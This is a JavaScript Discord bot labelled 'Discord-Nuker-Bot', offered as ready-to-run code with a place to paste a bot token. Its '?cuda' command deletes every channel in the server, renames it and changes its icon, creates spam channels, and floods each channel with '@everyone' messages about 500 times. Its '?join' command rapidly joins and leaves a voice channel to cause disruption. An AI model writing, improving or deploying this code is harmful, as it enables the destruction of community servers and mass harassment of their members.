const Token = ""; // just paste ur bot token here
const Discord = require("discord.js");
const bot = new Discord.Client
const guild = Discord.Guild
const prefix = "?";

bot.on('ready', () =>{
  console.log(`https://Mr-Cuda/Discord-Nuker-Bot/`);
    console.log(`ONLINE`);
      bot.user.setActivity(`/ferrari.com/`);
})

bot.on("message", async function (msg) {

if (msg.content.indexOf(`${prefix}join`) === 0) {
  msg.member.lastMessage.delete();
  if(!msg.member.voice.channel) return msg.channel.send("The fun fact is that i don't use discord anymore");
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join();
  msg.member.voice.channel.leave();
  msg.member.voice.channel.join(); 
  msg.member.voice.channel.leave(); 
  msg.member.voice.channel.join(); 
  msg.member.voice.channel.leave();
}

if (msg.content.indexOf(`${prefix}leave`) === 0) {
  msg.member.lastMessage.delete();
  msg.member.voice.channel.leave();
}

if (msg.content === `${prefix}cuda`) {
  msg.guild.channels.cache.forEach(channel => channel.delete())
  msg.guild.setIcon("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqU6-kvj_Sh-udibKRAUT-bo_ApT0NYtUG-w&usqp=CAU")
  msg.guild.setName("visit https://ferrari.com")
    for(let i =0;i<=15;i++) {
    await msg.guild.channels.create('so um giusepp', {
      type: 'text',
      permissionOverwrites: [
        {
          id: msg.author.id,
        },
      ],
    })
    }
    for(let i =0;i<=500;i++) {
      msg.guild.channels.cache.forEach(channel => {
        channel.send('@everyone visit https://ferrari.com').catch(console.error);
      })
  }
}

});
bot.login(Token);
